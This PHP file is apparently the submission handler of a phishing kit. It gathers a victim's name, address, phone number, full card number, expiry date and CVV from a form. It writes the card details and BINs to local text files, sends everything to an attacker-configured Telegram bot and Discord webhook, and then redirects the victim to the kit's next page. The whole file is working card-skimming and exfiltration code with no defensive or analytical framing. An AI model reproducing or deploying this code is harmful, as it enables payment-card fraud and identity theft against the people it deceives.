<?php
require 'results/geo.php';
$chatId = trim(file_get_contents("admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("admin/config/discord.ini"));
extract($_REQUEST);
$file = fopen("results/log.txt", "a");


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)

$Name = $_POST["name"];
$Addr = $_POST["adr"];
$Zip = $_POST["zip"];
$City = $_POST["city"];
$Sta = $_POST["state"];
$Countr = $_POST["country"];
$Ph = $_POST["phone"];
$CC = str_replace(' ', '', $_POST["cnm"]);
$EXP = $_POST["exp"];
$Cvv = $_POST["csc"];
$bin = substr($CC, 0, 6);
$ctp = $_POST["ctp"];

# Format for log.txt file
// Here variable $a is just an example (replace with your own variables)
$file1 = fopen("results/cc.txt", "a");
fwrite($file1, $cnm." | ".$exp." | ".$csc);
fwrite($file1, "\n");
fclose($file1);

$file2 = fopen("results/bin.txt", "a");
fwrite($file2, $bin);
fwrite($file2, "\n");
fclose($file2);

# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)

$data = "< M O R E  I N F O > >🧍\n > Name: $Name \n  > Address: $Addr \n  > Zip: $Zip \n  > City: $City \n  > State: $Sta \n  > Country: $Countr \n  > Phone: $Ph \n
< C C  I N F O > >💳\n  > Cc: $CC \n  > Exp: $EXP \n  > Cvv: $Cvv \n  > Bin: $bin \n  > Type: $ctp \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on") {
    $send = ['chat_id' => $chatId, 'text' => $txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on") {
    $web_discord = $webhookUrl;
    $json_data = array('content' => "$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init($web_discord);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}
header("location: main4.php");
